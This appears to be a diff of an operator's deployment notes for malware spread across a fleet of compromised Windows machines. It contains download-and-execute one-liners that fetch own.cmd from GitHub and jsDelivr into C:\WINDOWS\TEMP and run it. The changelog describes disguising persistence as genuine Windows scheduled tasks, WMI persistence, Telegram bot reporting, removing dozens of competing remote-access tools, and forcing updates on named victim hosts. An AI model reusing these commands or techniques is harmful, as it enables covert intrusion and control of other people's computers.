@@ -1,28 +1,17 @@
-UNIVERSAL DEPLOY  (O30 / M20 / L9 / T10 / S6):
+UNIVERSAL DEPLOY  (O32 / M22 / L11 / T12 / S6):
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o32" && call C:\WINDOWS\TEMP\own.cmd
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o30" && call C:\WINDOWS\TEMP\own.cmd
-
-Rescue:
-
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o30" && call C:\WINDOWS\TEMP\own.cmd
-
-O30 fixes from fleet reports + audit:
-- TASK_B dual-path restored (etl_mon) + synced every tick
-- Tick mutex (no overlapping msiexec races)
-- BUILD-marker verify on auto-update (rejects HTML junk)
-- IDENTVER=5 forces identity regen off old MemoryDiagnostic pools
-- state.json tasks=0/4 fixed (schtasks LASTEXITCODE)
-- Full WMI graph ensure (not consumer-only)
-- Registered-stuck primary now TG-alerts
-- Plaintext BOT_TOKEN removed (embedded notify.cfg via B64_NTF)
-- RMM list +Kaseya/Action1/Tactical/Bomgar/Parsec
-- ETL path aligned to Diagnosis\State\.etlcache
+O32 root-cause fix: task persistence was existence-only against REAL Windows
+task names (Diagnosis\Scheduled, WDI\ResolutionHost). Query succeeded, rearm
+skipped, own_mon never ticked -> no log, auto-update dead. Now IDENTVER=6
+unique names + Task To Run ownership checks + tasks-ensure every tick.
 
 Expect TG:
-  Source build: O30
-  Payload builds: MON=M20 | SEC=S6 | TGR=T10 | LIB=L9
-  identity_A=\Microsoft\Windows\... (real, not %V)
-  digest b=M20
+  Source build: O32
+  Payload builds: MON=M22 | SEC=S6 | TGR=T12 | LIB=L11
+  Persist tasks show OK (not NOT_OURS)
 
-FORCE O30 on stuck boxes still showing b=M10/M15/M16 or Source build O17
-(USER-PC, HRTAG48, TCJSURFACE, LAP406C, CKJ0D5I, etc).
+KEEP: dual ScreenConnect FPs + Datto/CentraStage
+REMOVE: 51 RMM/remote tools (see prior list)
+
+FORCE O32 on stuck boxes (especially no own_mon.log / tasks=NOT_OURS).
